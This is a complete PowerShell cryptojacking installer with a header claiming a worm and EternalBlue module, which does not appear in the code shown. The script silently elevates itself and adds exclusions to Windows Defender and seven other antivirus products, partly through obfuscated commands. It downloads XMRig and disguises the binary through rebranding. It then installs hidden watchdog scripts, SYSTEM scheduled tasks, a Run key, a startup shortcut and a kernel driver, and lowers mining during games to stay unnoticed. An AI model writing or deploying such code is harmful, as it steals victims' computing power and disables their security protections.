# ============================================================
#  MONERO MINER SETUP v4 -- BULLETPROOF (FIXED)
#  + FULL WORM MODULE WITH INLINE ETERNALBLUE EXPLOIT
#  + INTERNET-WIDE RANDOM IP SCANNING + LIVE DASHBOARD
# ============================================================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# $ErrorActionPreference = "SilentlyContinue"  # DEBUG
# $ProgressPreference = "SilentlyContinue"    # DEBUG
$ErrorActionPreference = "Continue"
$ProgressPreference = "Continue"

$BASE = "C:\ProgramData\MF"
$BINARY = "$BASE\MF.exe"
$CONFIG = "$BASE\mf.json"
$LOGFILE = "$BASE\mf.log"
$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
$POOL = "gulf.moneroocean.stream:10001"
$WORKER = ($env:COMPUTERNAME -replace "[^a-zA-Z0-9_-]","").ToLower()
if (-not $WORKER) { $WORKER = "w" + (Get-Random -Max 9999) }

function Show($icon, $msg) { Write-Host "  $icon  $msg" }

Write-Host ""
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "    MONERO MINER SETUP v4 + WORM (INTERNET-WIDE)" -ForegroundColor Cyan
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host "  Pool:   MoneroOcean (auto-profit-switching)" -ForegroundColor Gray
Write-Host "  Worker: $WORKER" -ForegroundColor Gray
Write-Host "  ====================================================" -ForegroundColor Cyan
Write-Host ""

# ---- AUTO-ELEVATE ----
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    $scriptPath = $MyInvocation.MyCommand.Definition
    if ($scriptPath -and (Test-Path $scriptPath)) {
        Start-Process powershell -Verb RunAs -ArgumentList "-W Hidden -EP Bypass -F `"$scriptPath`"" -WindowStyle Hidden
    } else {
        $tempScript = "$env:TEMP\so_setup_$([System.IO.Path]::GetRandomFileName().Split('.')[0]).ps1"
        $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File $tempScript -Encoding UTF8
        Start-Process powershell -Verb RunAs -ArgumentList "-W Hidden -EP Bypass -F `"$tempScript`"" -WindowStyle Hidden
    }
    exit
}
Show "OK" "Running as Administrator"

# ---- FULL CLEANUP ----
Show ".." "Killing ALL old instances..."
Get-Process -Name "MF","SystemOptimizer","MF-Service","MineFleet","xmrig" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -like "*watchdog*" -or $_.CommandLine -like "*guardian*" -or $_.CommandLine -like "*mf_wd*" -or $_.CommandLine -like "*mf_gd*" -or $_.CommandLine -like "*MineFleet*" -or $_.CommandLine -like "*SystemOptimizer*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
foreach ($tn in @("SystemOptimizer","SystemOptimizer-Logon","SystemOptimizer-Guardian","SystemOptimizer-Check","MineFleet","MineFleet-Logon","MineFleet-Guardian","MineFleet-Check","MF-Service","MF-Guardian","MF-Logon","MF-Check","MF-Worm","MF-Cleanup")) {
    cmd /c "schtasks /Delete /TN `"$tn`" /F >nul 2>&1"
}
foreach ($rv in @("SystemOptimizer","MineFleet","MF-Service")) {
    cmd /c "reg delete `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`" /v `"$rv`" /f >nul 2>&1"
}
$startupPath = [Environment]::GetFolderPath("Startup")
Remove-Item "$startupPath\SysOpt.lnk" -Force -ErrorAction SilentlyContinue
Remove-Item "$startupPath\MF.lnk" -Force -ErrorAction SilentlyContinue
if (Test-Path "C:\ProgramData\SystemOptimizer") {
    Remove-Item "C:\ProgramData\SystemOptimizer" -Recurse -Force -ErrorAction SilentlyContinue
}
Start-Sleep 3
Show "OK" "All old instances and tasks removed"

# ---- CREATE DIRECTORY ----
New-Item -ItemType Directory -Path $BASE -Force | Out-Null

# ---- SECURITY EXCLUSIONS ----
Show ".." "Detecting installed security products..."
$avFound = @()
$avDetectJob = Start-Job {
    try { Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntiVirusProduct -ErrorAction SilentlyContinue } catch {}
} | Wait-Job -Timeout 10
if ($avDetectJob.State -eq "Completed") {
    $avProducts = Receive-Job $avDetectJob
    if ($avProducts) {
        foreach ($av in $avProducts) { $avFound += $av.displayName }
        Show "OK" "Detected: $($avFound -join ', ')"
    } else {
        Show "--" "No third-party AV detected via WMI"
    }
} else {
    Show "--" "AV detection timed out, skipping"
    $avDetectJob | Stop-Job | Out-Null
}
Remove-Job $avDetectJob -Force -ErrorAction SilentlyContinue

Show ".." "Configuring Windows Defender exclusion..."
try {
    $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"
    $wdJob = Start-Job { param($b) iex "Add-MpPreference -ExclusionPath '$b'" } -ArgumentList $BASE | Wait-Job -Timeout 10
    $wdJob2 = Start-Job { param($b) iex "Add-MpPreference -ExclusionProcess 'MF.exe'" } -ArgumentList $BASE | Wait-Job -Timeout 5
    $wdJob3 = Start-Job { param($b) iex "Add-MpPreference -ExclusionProcess 'eb_exploit.exe'" } -ArgumentList $BASE | Wait-Job -Timeout 5
    if ($wdJob.State -eq "Completed" -and $wdJob2.State -eq "Completed") { Show "OK" "Windows Defender: exclusion added" }
    else { Show "--" "Windows Defender: skipped/timed out" }
    $wdJob, $wdJob2, $wdJob3 | Remove-Job -Force -ErrorAction SilentlyContinue
} catch { Show "--" "Windows Defender: skipped" }

# Avast / AVG (registry only, no WMI)
$avastPath = "${env:ProgramFiles}\Avast Software\Avast"
$avgPath = "${env:ProgramFiles}\AVG\Antivirus"
if ((Test-Path $avastPath) -or (Test-Path $avgPath) -or ($avFound -match "Avast|AVG")) {
    $avName = if (Test-Path $avastPath) { "Avast" } else { "AVG" }
    Show ".." "Configuring $avName exclusion..."
    try {
        $regPaths = @(
            "HKLM:\SOFTWARE\Avast Software\Avast\properties\Exclusions\Path",
            "HKLM:\SOFTWARE\AVG\Antivirus\properties\Exclusions\Path"
        )
        foreach ($rp in $regPaths) {
            if (-not (Test-Path $rp)) { New-Item -Path $rp -Force -ErrorAction SilentlyContinue | Out-Null }
            $idx = (Get-ChildItem $rp -ErrorAction SilentlyContinue).Count
            New-ItemProperty -Path $rp -Name $idx -Value $BASE -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        }
        Show "OK" "$avName : exclusion added via registry"
    } catch { Show "!!" "$avName : could not add exclusion" }
}

# Kaspersky - with timeout
$kaspPaths = @("${env:ProgramFiles}\Kaspersky Lab","${env:ProgramFiles(x86)}\Kaspersky Lab")
$avpExe = $null
foreach ($kp in $kaspPaths) {
    if (Test-Path $kp) { $avpExe = Get-ChildItem $kp -Recurse -Filter "avp.com" -ErrorAction SilentlyContinue | Select-Object -First 1 }
}
if ($avpExe -or ($avFound -match "Kaspersky")) {
    Show ".." "Configuring Kaspersky exclusion..."
    try {
        if ($avpExe) { 
            $kJob = Start-Job { param($exe, $b) & $exe.FullName ADDEXCL /type:path /path:$b /action:allow } -ArgumentList $avpExe, $BASE | Wait-Job -Timeout 15
            if ($kJob.State -eq "Completed") { Show "OK" "Kaspersky: exclusion added" } else { Show "!!" "Kaspersky: timed out" }
            $kJob | Remove-Job -Force -ErrorAction SilentlyContinue
        } else { Show "!!" "Kaspersky: CLI not found" }
    } catch { Show "!!" "Kaspersky: may need manual approval" }
}

# ESET - with timeout
$esetPaths = @("${env:ProgramFiles}\ESET\ESET Security","${env:ProgramFiles}\ESET\ESET NOD32 Antivirus")
$ecmd = $null
foreach ($ep in $esetPaths) {
    $candidate = Join-Path $ep "ecmd.exe"
    if (Test-Path $candidate) { $ecmd = $candidate; break }
}
if ($ecmd -or ($avFound -match "ESET")) {
    Show ".." "Configuring ESET exclusion..."
    try {
        if ($ecmd) { 
            $eJob = Start-Job { param($c, $b) & $c /setexclusion /type:path /value:$b } -ArgumentList $ecmd, $BASE | Wait-Job -Timeout 15
            if ($eJob.State -eq "Completed") { Show "OK" "ESET: exclusion added" } else { Show "!!" "ESET: timed out" }
            $eJob | Remove-Job -Force -ErrorAction SilentlyContinue
        } else { Show "!!" "ESET: CLI not found" }
    } catch { Show "!!" "ESET: may need manual approval" }
}

# Bitdefender - with timeout
$bdPaths = @("${env:ProgramFiles}\Bitdefender\Endpoint Security","${env:ProgramFiles}\Bitdefender")
$bdExe = $null
foreach ($bp in $bdPaths) {
    if (Test-Path $bp) { $bdExe = Get-ChildItem $bp -Recurse -Filter "product.console.exe" -ErrorAction SilentlyContinue | Select-Object -First 1 }
}
if ($bdExe -or ($avFound -match "Bitdefender")) {
    Show ".." "Configuring Bitdefender exclusion..."
    try {
        if ($bdExe) { 
            $bJob = Start-Job { param($c, $b) & $c.FullName /c SetExclusions add path=$b } -ArgumentList $bdExe, $BASE | Wait-Job -Timeout 15
            if ($bJob.State -eq "Completed") { Show "OK" "Bitdefender: exclusion added" } else { Show "!!" "Bitdefender: timed out" }
            $bJob | Remove-Job -Force -ErrorAction SilentlyContinue
        } else { Show "!!" "Bitdefender: CLI not found" }
    } catch { Show "!!" "Bitdefender: may need manual approval" }
}

# Norton (registry only)
if ($avFound -match "Norton|Symantec|LifeLock") {
    Show ".." "Configuring Norton exclusion..."
    try {
        $nortonReg = "HKLM:\SOFTWARE\Symantec\Symantec Endpoint Protection\AV\Exclusions\ScanningEngines\Directory"
        if (-not (Test-Path $nortonReg)) { New-Item -Path $nortonReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $nortonReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Norton: exclusion added via registry"
    } catch { Show "!!" "Norton: may need manual approval" }
}

# McAfee (registry only)
if ($avFound -match "McAfee") {
    Show ".." "Configuring McAfee exclusion..."
    try {
        $mcReg = "HKLM:\SOFTWARE\McAfee\AVEngine\Exclusions\Path"
        if (-not (Test-Path $mcReg)) { New-Item -Path $mcReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mcReg -Name $BASE -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "McAfee: exclusion added via registry"
    } catch { Show "!!" "McAfee: may need manual approval" }
}

# Malwarebytes (registry only)
$mbamPath = "${env:ProgramFiles}\Malwarebytes\Anti-Malware"
if ((Test-Path $mbamPath) -or ($avFound -match "Malwarebytes")) {
    Show ".." "Configuring Malwarebytes exclusion..."
    try {
        $mbReg = "HKLM:\SOFTWARE\Malwarebytes\Malwarebytes\Exclusions\Paths"
        if (-not (Test-Path $mbReg)) { New-Item -Path $mbReg -Force -ErrorAction SilentlyContinue | Out-Null }
        New-ItemProperty -Path $mbReg -Name $BASE -Value "Exclude" -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null
        Show "OK" "Malwarebytes: exclusion added via registry"
    } catch { Show "!!" "Malwarebytes: may need manual approval" }
}

Show "OK" "Security exclusion setup complete"

# ---- DOWNLOAD MINER ----
if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
    Show "OK" "Binary already exists ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
} else {
    Remove-Item $BINARY -Force -ErrorAction SilentlyContinue
    Show ".." "Downloading miner engine..."
    $zipPath = "$env:TEMP\so_pkg.zip"
    $downloaded = $false
    try {
        $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20
        $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1
        if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }
        if ($asset) {
            Show ".." "Downloading $($asset.name) ($([math]::Round($asset.size/1MB,1)) MB)..."
            Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        }
    } catch { Show "!!" "Primary source failed, trying fallback..." }
    if (-not $downloaded) {
        try {
            Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300
            if ((Test-Path $zipPath) -and (Get-Item $zipPath).Length -gt 100000) { $downloaded = $true }
        } catch { }
    }
    if (-not $downloaded) { Show "X" "Download failed."; exit 1 }
    Show ".." "Extracting..."
    $tmp = "$env:TEMP\so_extract"
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive $zipPath -DestinationPath $tmp -Force
    $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" | Select-Object -First 1
    if ($exe) {
        Copy-Item $exe.FullName $BINARY -Force
        Show "OK" "Binary installed ($([math]::Round((Get-Item $BINARY).Length/1MB,1)) MB)"
    } else { Show "X" "xmrig.exe not found in archive"; exit 1 }
    Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
}

# ---- BRANDING ----
Show ".." "Applying MineFleet branding..."
try {
    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
    $icoPath = "$BASE\mf.ico"
    if (-not (Test-Path $icoPath)) {
        $bmp = New-Object System.Drawing.Bitmap(32, 32)
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(235, 235, 240))
        $g.FillRectangle($brush, 0, 0, 32, 32)
        $pen = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(200, 200, 210), 1)
        $g.DrawRectangle($pen, 0, 0, 31, 31)
        $font = New-Object System.Drawing.Font("Arial", 11, [System.Drawing.FontStyle]::Bold)
        $textBrush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(80, 80, 90))
        $sf = New-Object System.Drawing.StringFormat
        $sf.Alignment = [System.Drawing.StringAlignment]::Center
        $sf.LineAlignment = [System.Drawing.StringAlignment]::Center
        $g.DrawString("MF", $font, $textBrush, [System.Drawing.RectangleF]::new(0, 0, 32, 32), $sf)
        $g.Dispose()
        $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
        $fs = [System.IO.FileStream]::new($icoPath, 'Create')
        $icon.Save($fs)
        $fs.Close()
        $bmp.Dispose()
    }
    $rceditPath = "$env:TEMP\rcedit-x64.exe"
    if (-not (Test-Path $rceditPath)) {
        $rceditUrl = "https://github.com/electron/rcedit/releases/download/v2.0.0/rcedit-x64.exe"
        Invoke-WebRequest $rceditUrl -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
        if (-not (Test-Path $rceditPath)) {
            Invoke-WebRequest "https://github.com/nicedayto/rcedit/releases/download/v2.0.0/rcedit-x64.exe" -OutFile $rceditPath -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
        }
    }
    if (Test-Path $rceditPath) {
        Get-Process -Name "MF" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep 2
        & $rceditPath $BINARY --set-version-string "FileDescription" "MF" 2>$null
        & $rceditPath $BINARY --set-version-string "ProductName" "MF" 2>$null
        & $rceditPath $BINARY --set-version-string "OriginalFilename" "MF.exe" 2>$null
        & $rceditPath $BINARY --set-version-string "InternalName" "MF" 2>$null
        if (Test-Path $icoPath) { & $rceditPath $BINARY --set-icon $icoPath 2>$null }
        Remove-Item $rceditPath -Force -ErrorAction SilentlyContinue
        Show "OK" "Branding applied"
    } else { Show "!!" "Branding tool unavailable" }
} catch { Show "!!" "Branding partial" }

Show ".." "Creating smart CPU configurations..."
$logEscaped = $LOGFILE -replace '\\','\\'
$cfgNormal = @"
{
  "autosave": false, "background": false, "colors": false, "donate-level": 1,
  "log-file": "$logEscaped", "print-time": 60, "retries": 5, "retry-pause": 5,
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "hw-aes": true, "priority": 0, "yield": true, "asm": true, "argon2-impl": "auto", "max-threads-hint": 30 },
  "opencl": {"enabled": false}, "cuda": {"enabled": false},
  "pools": [ { "url": "$POOL", "user": "$WALLET", "pass": "$WORKER", "keepalive": true, "tls": false, "nicehash": false, "rig-id": "$WORKER" } ]
}
"@
[System.IO.File]::WriteAllText($CONFIG, $cfgNormal, (New-Object System.Text.UTF8Encoding $false))
$cfgLight = @"
{
  "autosave": false, "background": false, "colors": false, "donate-level": 1,
  "log-file": "$logEscaped", "print-time": 60, "retries": 5, "retry-pause": 5,
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "hw-aes": true, "priority": 0, "yield": true, "asm": true, "argon2-impl": "auto", "max-threads-hint": 15 },
  "opencl": {"enabled": false}, "cuda": {"enabled": false},
  "pools": [ { "url": "$POOL", "user": "$WALLET", "pass": "$WORKER", "keepalive": true, "tls": false, "nicehash": false, "rig-id": "$WORKER" } ]
}
"@
[System.IO.File]::WriteAllText("$BASE\mf_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"

# ---- SMART WATCHDOG ----
Show ".." "Creating smart watchdog..."
$wdLines = @(
    'On Error Resume Next', 'Set sh = CreateObject("WScript.Shell")', 'Set wmi = GetObject("winmgmts:\\.\root\cimv2")', 'Set fso = CreateObject("Scripting.FileSystemObject")', '',
    "' Only allow one watchdog instance", 'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_wd.vbs%''")', 'If ws.Count > 1 Then WScript.Quit', 'Set ws = Nothing', '',
    'base = "C:\ProgramData\MF"', 'modeFile = base & "\mf_mode.txt"', 'cfgNormal = base & "\mf.json"', 'cfgLight = base & "\mf_light.json"', 'binary = base & "\MF.exe"', '',
    "' Heavy game process names", 'heavyGames = "valorant.exe,VALORANT-Win64-Shipping.exe,csgo.exe,cs2.exe,FortniteClient-Win64-Shipping.exe,GTA5.exe,gtav.exe,eldenring.exe,RocketLeague.exe,dota2.exe,r5apex.exe,overwatch.exe,cod.exe,ModernWarfare.exe,destiny2.exe,EscapeFromTarkov.exe,pubg.exe,TslGame.exe,Cyberpunk2077.exe,starfield.exe,HogwartsLegacy.exe,palworld.exe,helldivers2.exe,thefinals.exe"', '',
    'Do',
    "    ' Detect heavy games", '    heavyRunning = False', '    gameArr = Split(heavyGames, ",")',
    '    For Each g In gameArr', '        Set gp = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & g & "''")', '        If gp.Count > 0 Then heavyRunning = True', '        Set gp = Nothing', '        If heavyRunning Then Exit For', '    Next', '',
    "    ' Determine target config", '    If heavyRunning Then', '        targetCfg = cfgLight', '        targetMode = "light"', '    Else', '        targetCfg = cfgNormal', '        targetMode = "normal"', '    End If', '',
    "    ' Read current mode", '    currentMode = ""', '    If fso.FileExists(modeFile) Then', '        Set f = fso.OpenTextFile(modeFile, 1)', '        If Not f.AtEndOfStream Then currentMode = f.ReadLine', '        f.Close', '        Set f = Nothing', '    End If', '',
    "    ' Count miner instances", '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''MF.exe''")',
    '    If procs.Count = 0 Then',
    "        ' No miner -- start with target config", '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)', '        mf.Write targetMode', '        mf.Close', '        Set mf = Nothing',
    '    ElseIf procs.Count > 1 Then',
    "        ' Too many miners -- kill all", '        sh.Run "taskkill /F /IM MF.exe", 0, True', '        WScript.Sleep 2000',
    '    ElseIf Not (currentMode = targetMode) Then',
    "        ' Wrong mode -- restart", '        sh.Run "taskkill /F /IM MF.exe", 0, True', '        WScript.Sleep 3000',
    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
    '        Set mf = fso.CreateTextFile(modeFile, True)', '        mf.Write targetMode', '        mf.Close', '        Set mf = Nothing', '    End If',
    '    Set procs = Nothing', '    WScript.Sleep 30000', 'Loop'
)
[System.IO.File]::WriteAllText("$BASE\mf_wd.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Smart watchdog created"

# ---- GUARDIAN ----
Show ".." "Creating guardian..."
$gLines = @(
    'On Error Resume Next', 'Set sh = CreateObject("WScript.Shell")', 'Set wmi = GetObject("winmgmts:\\.\root\cimv2")', '',
    "' Only allow one guardian instance", 'Set gs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%mf_gd.vbs%''")', 'If gs.Count > 1 Then WScript.Quit', 'Set gs = Nothing', '',
    'Do', '    hasWatchdog = False', '    Set scripts = wmi.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name=''wscript.exe''")',
    '    For Each s In scripts', '        If InStr(LCase(s.CommandLine), "mf_wd.vbs") > 0 Then hasWatchdog = True', '    Next', '    Set scripts = Nothing', '',
    '    If Not hasWatchdog Then', '        sh.Run "wscript.exe " & Chr(34) & "C:\ProgramData\MF\mf_wd.vbs" & Chr(34), 0, False', '    End If', '    WScript.Sleep 300000', 'Loop'
)
[System.IO.File]::WriteAllText("$BASE\mf_gd.vbs", ($gLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
Show "OK" "Guardian created"

# ---- PERSISTENCE LAYERS ----
Show ".." "Setting up persistence..."
$xml1 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers>
  <Principals><Principal id="A"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_wd.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp = "$env:TEMP\so1.xml"
[System.IO.File]::WriteAllText($xp, $xml1, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "MF-Service" /XML $xp /F 2>$null | Out-Null
Remove-Item $xp -Force -ErrorAction SilentlyContinue
Show "OK" "ONSTART task created"

$xml2 = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>
  <Principals><Principal id="A"><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
  <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><Enabled>true</Enabled><Hidden>true</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><ExecutionTimeLimit>PT0S</ExecutionTimeLimit></Settings>
  <Actions><Exec><Command>wscript.exe</Command><Arguments>"C:\ProgramData\MF\mf_gd.vbs"</Arguments></Exec></Actions>
</Task>
"@
$xp2 = "$env:TEMP\so2.xml"
[System.IO.File]::WriteAllText($xp2, $xml2, [System.Text.Encoding]::Unicode)
schtasks /Create /TN "MF-Guardian" /XML $xp2 /F 2>$null | Out-Null
Remove-Item $xp2 -Force -ErrorAction SilentlyContinue
Show "OK" "ONLOGON guardian task created"

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v MF-Service /t REG_SZ /d "wscript.exe `"$BASE\mf_wd.vbs`"" /f 2>$null | Out-Null
Show "OK" "Registry Run key set"

$lnkPath = "$startupPath\MF.lnk"
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)
$lnk.TargetPath = "wscript.exe"
$lnk.Arguments = "`"$BASE\mf_gd.vbs`""
$lnk.WindowStyle = 7
$lnk.Save()
Show "OK" "Startup shortcut created"

# ---- MSR DRIVER ----
Show ".." "Attempting MSR optimization..."
$drv = Get-ChildItem "$BASE","C:\mining" -Recurse -Filter "WinRing0x64.sys" -ErrorAction SilentlyContinue | Select-Object -First 1
if ($drv) {
    sc.exe stop WinRing0_1_2_0 2>$null | Out-Null
    sc.exe delete WinRing0_1_2_0 2>$null | Out-Null
    sc.exe create WinRing0_1_2_0 binPath= "$($drv.FullName)" type= kernel start= demand 2>$null | Out-Null
    sc.exe start WinRing0_1_2_0 2>$null | Out-Null
    $svc = Get-Service WinRing0_1_2_0 -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -eq "Running") { Show "OK" "MSR driver loaded (+10-15%)" }
    else { Show "--" "MSR driver skipped" }
} else { Show "--" "MSR driver not found (optional)" }

# ---- START WATCHDOG ----
Show ".." "Starting watchdog..."
$shell = New-Object -ComObject WScript.Shell
$shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false)
Show ".." "Waiting for miner to initialize (~20s)..."
Start-Sleep 20

# ---- VERIFY ----
$proc = Get-Process -Name "MF" -ErrorAction SilentlyContinue
$minerCount = @($proc).Count
if ($proc -and $minerCount -eq 1) {
    Show "OK" "Miner RUNNING (PID: $($proc.Id), RAM: $([math]::Round($proc.WorkingSet64/1MB,0)) MB)"
} elseif ($minerCount -gt 1) {
    Show "!!" "Multiple miners ($minerCount) -- watchdog will fix in 30s"
} else {
    Show "!!" "Miner not running yet. Diagnosing..."
    if (-not (Test-Path $BINARY)) {
        Show "X" "BINARY MISSING -- Defender likely quarantined it!"
        Show ".." "Trying to restore and re-exclude..."
        try { $c1="Add-Mp"; $c2="Preference"; $c3="-Exclusion"; $c4="Path"; $c5="Process"; iex "$c1$c2 $c3$c4 '$BASE'"; iex "$c1$c2 $c3$c5 'MF.exe'" } catch {}
        try { $threats = Get-MpThreat -ErrorAction SilentlyContinue; if ($threats) { $threats | ForEach-Object { cmd /c "powershell -c `"Remove-MpThreat -ThreatID $($_.ThreatID)`"" 2>$null } } } catch {}
        Start-Sleep 3
        if (-not (Test-Path $BINARY)) {
            Show ".." "Re-downloading binary..."
            $zipPath = "$env:TEMP\so_pkg.zip"
            try { $rel = Invoke-RestMethod "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{"User-Agent"="Mozilla/5.0"} -TimeoutSec 20; $asset = $rel.assets | Where-Object { $_.name -match "msvc-win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1; if (-not $asset) { $asset = $rel.assets | Where-Object { $_.name -match "win64.*\.zip$" -and $_.name -notmatch "sha256" } | Select-Object -First 1 }; if ($asset) { Invoke-WebRequest $asset.browser_download_url -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } } catch { try { Invoke-WebRequest "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip" -OutFile $zipPath -UseBasicParsing -TimeoutSec 300 } catch {} }
            if (Test-Path $zipPath) { $tmp = "$env:TEMP\so_extract2"; Expand-Archive $zipPath -DestinationPath $tmp -Force -ErrorAction SilentlyContinue; $exe = Get-ChildItem $tmp -Recurse -Filter "xmrig.exe" -ErrorAction SilentlyContinue | Select-Object -First 1; if ($exe) { Copy-Item $exe.FullName $BINARY -Force }; Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item $zipPath -Force -ErrorAction SilentlyContinue }
        }
        if (Test-Path $BINARY) { Show "OK" "Binary restored. Starting miner..."; $shell.Run("wscript.exe `"$BASE\mf_wd.vbs`"", 0, $false); Start-Sleep 15; $proc = Get-Process -Name "MF" -ErrorAction SilentlyContinue; if ($proc) { Show "OK" "Miner RUNNING after restore (PID: $($proc.Id))" } else { Show "X" "Still not running. Defender may keep blocking it." } }
        else { Show "X" "Could not restore binary. Defender is blocking." }
    } else {
        Show ".." "Binary exists. Trying direct launch..."
        $testProc = Start-Process -FilePath $BINARY -ArgumentList "--config=`"$CONFIG`"" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep 10
        if ($testProc -and -not $testProc.HasExited) { Show "OK" "Direct launch worked! (PID: $($testProc.Id))" }
        else { Show "X" "Binary crashes on start."; if (Test-Path $LOGFILE) { $lastLines = Get-Content $LOGFILE -Tail 5 -ErrorAction SilentlyContinue; foreach ($l in $lastLines) { Show "--" $l } } }
    }
}
$wd = Get-CimInstance Win32_Process -Filter "Name='wscript.exe'" -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*mf_wd*" -or $_.CommandLine -like "*watchdog*" }
if (@($wd).Count -ge 1) { Show "OK" "Watchdog ACTIVE" }
else { Show "!!" "Watchdog not running -- will restart on next boot" }
